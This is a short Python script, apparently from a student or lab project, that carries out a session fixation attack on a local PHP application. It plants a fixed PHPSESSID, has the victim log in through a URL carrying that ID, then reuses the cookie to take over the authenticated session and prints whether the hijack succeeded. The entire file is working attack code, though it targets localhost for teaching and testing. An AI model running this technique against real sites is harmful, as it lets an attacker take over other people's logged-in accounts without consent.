import requests

LOGIN_URL = "http://localhost/CyberProject/login.php"
HOME_URL = "http://localhost/CyberProject/home.php"

# 1. The attacker sets a session ID in advance
fixed_sid = "HACKER_SESSION_ID_123"
cookies = {'PHPSESSID': fixed_sid}

def run_fixation():
    print(f"[*] Starting Session Fixation attack...")
    print(f"[*] Pre-setting Session ID: {fixed_sid}")
    
    # The attacker "visits" the site so that the server knows about this session
    requests.get(LOGIN_URL, cookies=cookies)
    
    print("\n" + "="*50)
    print("STEP 1: The 'Trap' is set.")
    print(f"Now, open your browser and go to:")
    print(f"{LOGIN_URL}?PHPSESSID={fixed_sid}")
    print("Log in as ANY user you want in the browser.")
    print("="*50)
    
    input("\n[>] After you logged in the browser, press ENTER here to hijack the session...")

    #2. Attempting to access the home page with the same session
    print(f"[*] Attempting to hijack session {fixed_sid}...")
    response = requests.get(HOME_URL, cookies=cookies)
    
    if "Welcome" in response.text:
        print("\n[!!!] ATTACK SUCCESSFUL [!!!]")
        print("[+] The script is now logged in as the user from the browser!")
    else:
        print("\n[-] Attack failed. The session is not authenticated.")
        print("[?] Did you forget to log in? Or maybe you fixed the vulnerability?")

if __name__ == "__main__":
    run_fixation()